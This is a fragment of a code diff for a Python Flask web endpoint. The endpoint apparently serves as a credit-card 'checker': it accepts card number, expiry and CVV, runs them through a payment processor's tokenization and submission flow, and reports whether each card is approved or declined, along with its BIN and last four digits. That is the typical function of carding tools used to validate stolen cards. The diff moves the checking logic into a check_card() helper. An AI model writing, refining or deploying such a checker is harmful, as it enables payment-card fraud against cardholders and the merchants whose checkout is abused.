+        return jsonify({'status': 'error', 'message': 'missing cc param'}), 400
+    if len(raw.split('|')) != 4:
+        return jsonify({'status': 'error', 'message': 'use cc|mm|yy|cvv'}), 400
     try:
-        raw = request.args.get('cc')
-        if not raw:
-            return jsonify({'status': 'error', 'message': 'missing cc param'}), 400
-        parts = raw.strip().split('|')
-        if len(parts) != 4:
-            return jsonify({'status': 'error', 'message': 'use cc|mm|yy|cvv'}), 400
-        cc, mm, yy, cvv = (p.strip() for p in parts)
-        if not (cc.isdigit() and 15 <= len(cc) <= 16):
-            return jsonify({'status': 'error', 'message': 'bad card number'}), 400
-        if not (mm.isdigit() and 1 <= int(mm) <= 12):
-            return jsonify({'status': 'error', 'message': 'bad month'}), 400
-        if not (yy.isdigit() and len(yy) == 2):
-            return jsonify({'status': 'error', 'message': 'bad year'}), 400
-        if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
-            return jsonify({'status': 'error', 'message': 'bad cvv'}), 400
-
-        auth = grab_token(s)
-        if not auth:
-            return jsonify({'status': 'error', 'message': 'no auth token'}), 200
-
-        nonce, err = tokenize(s, auth, cc, mm, yy, cvv)
-        if not nonce:
-            return jsonify({'status': 'declined',
-                            'message': scrub(err or 'tokenization failed'),
-                            'bin': cc[:6], 'last4': cc[-4:]}), 200
-
-        result = submit(s, nonce)
-        result.update({'card': f"{cc[:6]}******{cc[-4:]}",
-                       'bin': cc[:6], 'last4': cc[-4:]})
-        return jsonify(result), 200
+        line, status, extra = check_card(raw)
     except Exception as e:
         return jsonify({'status': 'error', 'message': scrub(str(e))}), 500
-    finally:
-        s.close()
+
+    if status == "Approved":
+        return jsonify({'status': 'approved', 'message': 'Auth Successfully',
+                        'card': raw.split('|')[0][:6] + '******' + raw.split('|')[0][-4:]}), 200
+    if status == "Declined_2105":
+        return jsonify({'status': 'declined', 'message': 'PROCESSOR_DECLINED : 2105',
+                        'raw': scrub(extra)}), 200
+    return jsonify({'status': 'declined', 'message': status,
+                    'raw': scrub(extra)}), 200
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
